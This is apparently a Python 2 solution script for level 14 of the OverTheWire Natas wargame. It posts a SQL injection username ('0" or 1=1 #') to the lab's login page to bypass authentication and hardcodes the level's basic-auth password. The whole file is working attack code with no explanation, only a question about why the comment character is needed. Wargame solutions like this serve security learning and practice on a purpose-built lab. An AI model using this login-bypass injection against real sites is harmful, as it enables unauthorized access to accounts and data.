#!/usr/bin/env python
#thanks to https://github.com/andigena/natas/blob/master/natas14.py
import re
import requests

url = 'http://natas14.natas.labs.overthewire.org/index.php?debug=1'
username='''0" or 1=1 #'''
#why need # ???
payload=dict(username=username)

auth = ('natas14', 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1')
r = requests.post(url, auth=auth, data=payload)
print r.content
